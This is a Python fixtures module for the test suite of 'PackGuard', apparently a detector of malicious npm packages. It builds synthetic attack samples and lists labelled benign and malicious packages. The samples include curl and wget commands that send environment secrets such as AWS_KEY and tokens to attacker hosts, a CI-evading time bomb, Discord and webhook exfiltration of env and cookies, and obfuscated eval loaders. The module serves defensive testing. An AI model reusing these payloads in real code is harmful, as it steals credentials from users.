"""
PackGuard Stage 2 v5 — E2E Test Suite Common Test Fixtures and Generators.

Provides standalone helper utilities, synthetic attack vector generators,
and ground-truth package fixtures for the 4-tier E2E test harness.
"""

import base64
import importlib.util
import os
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Path resolution: allow importing from v5 directly
V5_DIR = Path(__file__).resolve().parent.parent
V4_DIR = V5_DIR.parent / "v4"

if str(V5_DIR) not in sys.path:
    sys.path.insert(0, str(V5_DIR))


def import_v5_module(module_name: str, fallback_to_v4: bool = False) -> Any:
    """
    Safely import a module from v5.
    If the module is not yet present (in-progress milestone) and fallback_to_v4 is True,
    falls back to the v4 reference implementation.
    """
    v5_path = V5_DIR / f"{module_name}.py"
    if v5_path.is_file():
        spec = importlib.util.spec_from_file_location(f"v5.{module_name}", str(v5_path))
        if spec and spec.loader:
            mod = importlib.util.module_from_spec(spec)
            sys.modules[f"v5.{module_name}"] = mod
            spec.loader.exec_module(mod)
            return mod

    if fallback_to_v4:
        v4_path = V4_DIR / f"{module_name}.py"
        if v4_path.is_file():
            spec = importlib.util.spec_from_file_location(f"v4.{module_name}", str(v4_path))
            if spec and spec.loader:
                mod = importlib.util.module_from_spec(spec)
                sys.modules[f"v4.{module_name}"] = mod
                spec.loader.exec_module(mod)
                return mod

    return None


# ==============================================================================
# Synthetic Attack Vector Generators for Tiers 1–3
# ==============================================================================

def make_polyglot_svg(payload_js: str = 'require("child_process").exec("curl https://evil.com?p=" + process.env.TOKEN);') -> str:
    """Generate a dual-format SVG/JS polyglot embedding payload inside <script>."""
    return f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
  <script type="text/javascript">
    //<![CDATA[
    {payload_js}
    //]]>
  </script>
</svg>"""


def make_polyglot_html_event(payload_js: str = 'eval(Buffer.from("dmFyIGE9MTs=", "base64").toString());') -> str:
    """Generate an HTML snippet with inline script and XML event handlers."""
    attr_safe = payload_js.replace('"', '&quot;')
    return f"""<!DOCTYPE html>
<html>
<body onload="{attr_safe}">
  <img src="avatar.png" onerror="{attr_safe}" />
  <script>
    {payload_js}
  </script>
</body>
</html>"""


def make_shell_polyglot(payload_js: str = 'require("child_process").execSync("cat /etc/passwd");') -> str:
    """Generate a shell/JS polyglot file with shell script preamble."""
    return f""": //; exec node "$0" "$@"
const cp = require("child_process");
{payload_js}
"""


def make_wasm_loader_js(imports: Optional[List[str]] = None) -> str:
    """
    Generate a JavaScript WASM bridge importing system bindings
    and instantiating WebAssembly with magic header bytes.
    """
    if imports is None:
        imports = ["eval", "fetch", "fd_write"]
    import_obj = ", ".join(f'"{imp}": function() {{}}' for imp in imports)
    return f"""
    const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60, 0x00, 0x00]);
    const importObject = {{
        env: {{ {import_obj} }}
    }};
    WebAssembly.instantiate(wasmBytes, importObject).then(result => {{
        result.instance.exports.main();
    }}).catch(err => console.error(err));
    """


def encode_zero_width_payload(ascii_text: str) -> str:
    r"""
    Encode an ASCII payload string into zero-width Unicode characters:
    \u200B = binary '0', \u200C = binary '1'.
    """
    bits = "".join(f"{ord(c):08b}" for c in ascii_text)
    return "".join("\u200C" if b == "1" else "\u200B" for b in bits)


def decode_zero_width_payload(zw_str: str) -> str:
    """Decode zero-width string back into UTF-8 text."""
    clean_bits = []
    for ch in zw_str:
        if ch == "\u200B":
            clean_bits.append("0")
        elif ch == "\u200C":
            clean_bits.append("1")
    bit_str = "".join(clean_bits)
    chars = []
    for i in range(0, len(bit_str) - 7, 8):
        byte = bit_str[i : i + 8]
        chars.append(chr(int(byte, 2)))
    return "".join(chars)


def make_timebomb_js(delay_ms: int = 86400000, trigger_epoch: int = 1731196800000) -> str:
    """Generate a time-bomb delayed execution trigger with sandbox evasion."""
    return f"""
    if (process.env.CI || process.env.GITHUB_ACTIONS || process.env.TRAVIS) {{
        // Evade CI sandbox runners
        return;
    }}
    if (Date.now() > {trigger_epoch}) {{
        setTimeout(function() {{
            const cp = require("child_process");
            cp.exec("curl -X POST https://exfil.attacker.site/drop -d @" + JSON.stringify(process.env));
        }}, {delay_ms});
    }}
    """


def make_obfuscator_io_js(strings: List[str], shift_count: int = 3) -> str:
    """
    Generate an Obfuscator.io shifted string array with IIFE de-shuffling loop.
    Rotates the array left by shift_count, accompanied by a shift/push while-loop.
    """
    # Rotated array
    rotated = list(strings)
    for _ in range(shift_count):
        rotated.append(rotated.pop(0))

    arr_literals = ", ".join(f'"{s}"' for s in rotated)
    return f"""
    var _0x9abc = [{arr_literals}];
    (function(_0xa, _0xb) {{
        var _0xc = function(_0xd) {{
            while (--_0xd) {{
                _0xa.push(_0xa.shift());
            }}
        }};
        _0xc(++_0xb);
    }}(_0x9abc, {shift_count}));

    function _0xget(index) {{
        return _0x9abc[index];
    }}
    const cp = require(_0xget(0));
    cp[_0xget(1)]("whoami");
    """


def make_hex_bracket_js() -> str:
    """Generate hex-bracket property accesses on global/process objects."""
    return r"""
    const g = global['\x65\x76\x61\x6c'];
    const envVal = process['\x65\x6e\x76']['\x41\x57\x53\x5f\x53\x45\x43\x52\x45\x54'];
    g("require('child_process').execSync('id');");
    """


def make_shell_exfil_js() -> str:
    """Generate child_process command where network exfiltration is embedded in shell command."""
    return """
    const cp = require("child_process");
    // Network module is NOT required in Node, but curl/wget does exfiltration!
    cp.exec("curl https://cloudapi.bytedance.net/drop?info=" + encodeURIComponent(process.env.AWS_KEY));
    cp.execSync("wget -qO- https://oast.fun/?h=" + process.env.USER);
    """


# ==============================================================================
# Ground-Truth Sample Packages for Tier 4 (Real-World & False Alarms)
# ==============================================================================

BENIGN_FALSE_ALARM_PACKAGES: List[Dict[str, Any]] = [
    {
        "package": "react-intl-currency-input-fork@0.2.0",
        "description": "Longtail formatting component with currency code tables and locale symbols",
        "expected_malicious": False,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0},
        "chunks": [
            {
                "file": "dist/index.js",
                "kind": "js",
                "text": """
                const CURRENCY_CODES = {
                    USD: { symbol: "$", precision: 2, thousandsSeparator: ",", decimalSeparator: "." },
                    EUR: { symbol: "€", precision: 2, thousandsSeparator: " ", decimalSeparator: "," },
                    SAR: { symbol: "﷼", precision: 2, thousandsSeparator: ",", decimalSeparator: "." },
                    JPY: { symbol: "¥", precision: 0, thousandsSeparator: ",", decimalSeparator: "" }
                };
                function formatCurrency(val, code) {
                    const c = CURRENCY_CODES[code] || CURRENCY_CODES.USD;
                    return c.symbol + " " + val.toFixed(c.precision);
                }
                module.exports = formatCurrency;
                """,
            }
        ],
    },
    {
        "package": "mime-db@1.54.0",
        "description": "Massive pure JSON MIME dictionary (bundled by malware in training set)",
        "expected_malicious": False,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0},
        "chunks": [
            {
                "file": "db.json",
                "kind": "js",
                "text": 'module.exports = {"application/json": {"source": "iana", "compressible": true, "extensions": ["json"]}};',
            }
        ],
    },
    {
        "package": "basic-auth@3.0.0",
        "description": "RFC 7617 HTTP Basic Auth header parser using Buffer.from('base64')",
        "expected_malicious": False,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0},
        "chunks": [
            {
                "file": "index.js",
                "kind": "js",
                "text": """
                function auth(req) {
                    if (!req || !req.headers) return null;
                    const header = req.headers.authorization;
                    if (!header || !header.startsWith("Basic ")) return null;
                    const credentials = Buffer.from(header.substring(6), "base64").toString("utf-8");
                    const index = credentials.indexOf(":");
                    if (index === -1) return null;
                    return { name: credentials.slice(0, index), pass: credentials.slice(index + 1) };
                }
                module.exports = auth;
                """,
            }
        ],
    },
    {
        "package": "vue-pretty-logger@0.9.0",
        "description": "AST transformation logger plugin with zero execution sinks",
        "expected_malicious": False,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0},
        "chunks": [
            {
                "file": "index.js",
                "kind": "js",
                "text": """
                function PrettyLogger(options) {
                    this.prefix = options.prefix || "[LOG]";
                }
                PrettyLogger.prototype.log = function(msg) {
                    console.log(this.prefix, msg);
                };
                module.exports = PrettyLogger;
                """,
            }
        ],
    },
    {
        "package": "timezone-name-offsets@1.0.2",
        "description": "Pure data timezone offset dictionary",
        "expected_malicious": False,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0},
        "chunks": [
            {
                "file": "index.js",
                "kind": "js",
                "text": 'module.exports = { "UTC": 0, "EST": -300, "Asia/Riyadh": 180, "Europe/London": 0 };',
            }
        ],
    },
    {
        "package": "husky-dev-installer@8.0.0",
        "description": "Legitimate dev tool postinstall script for husky git hooks",
        "expected_malicious": False,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 1},
        "chunks": [
            {
                "file": "package.json",
                "kind": "script",
                "text": '{"scripts": {"postinstall": "husky install"}}',
            }
        ],
    },
]

WILD_MALWARE_PACKAGES: List[Dict[str, Any]] = [
    {
        "package": "com.unity.cluster-display@1.0.0",
        "description": "Shell exfil via hostname / whoami inside child_process (missed in v4)",
        "expected_malicious": True,
        "expected_mitre": {"mitre_exec": 1, "mitre_steal": 1, "mitre_exfil": 1, "mitre_persist": 0},
        "chunks": [
            {
                "file": "index.js",
                "kind": "js",
                "text": """
                const { exec } = require("child_process");
                exec("curl -s https://cloudapi.bytedance.net/report?h=" + encodeURIComponent(process.env.USER));
                """,
            }
        ],
    },
    {
        "package": "finn-pulse-init@1.0.2",
        "description": "T2-mangled child_process malware (intercepted by flawed Rule 6 in v4)",
        "expected_malicious": True,
        "expected_mitre": {"mitre_exec": 1, "mitre_steal": 0, "mitre_exfil": 0, "mitre_persist": 0},
        "chunks": [
            {
                "file": "index.js",
                "kind": "js",
                "text": """
                // T2 mangled code: string length 13 matches child_process
                var v0 = require("child_process");
                v0.execSync("whoami");
                """,
            }
        ],
    },
    {
        "package": "vapark-aungpao-new@1.0.1",
        "description": "Rotated string array table concealing network stealer",
        "expected_malicious": True,
        "expected_mitre": {"mitre_exec": 1, "mitre_steal": 1, "mitre_exfil": 1, "mitre_persist": 0},
        "chunks": [
            {
                "file": "index.js",
                "kind": "js",
                "text": """
                var _0x5a = ["child_process", "execSync", "https", "process", "env"];
                // Array rotation loop
                (function(a, b) {
                    var fn = function(c) {
                        while (--c) a.push(a.shift());
                    };
                    fn(++b);
                }(_0x5a, 2));
                const cp = require("child_process");
                const net = require("https");
                net.get("https://discord.com/api/webhooks/999?t=" + JSON.stringify(process.env));
                cp.execSync("uname -a");
                """,
            }
        ],
    },
    {
        "package": "pulse-pwn-9f3a2@1.0.0",
        "description": "Browser DOM cookie theft and webhook exfiltration",
        "expected_malicious": True,
        "expected_mitre": {"mitre_exec": 0, "mitre_steal": 1, "mitre_exfil": 1, "mitre_persist": 0},
        "chunks": [
            {
                "file": "tracker.js",
                "kind": "js",
                "text": """
                fetch("https://webhook.site/abc-123?cookie=" + encodeURIComponent(document.cookie));
                """,
            }
        ],
    },
]
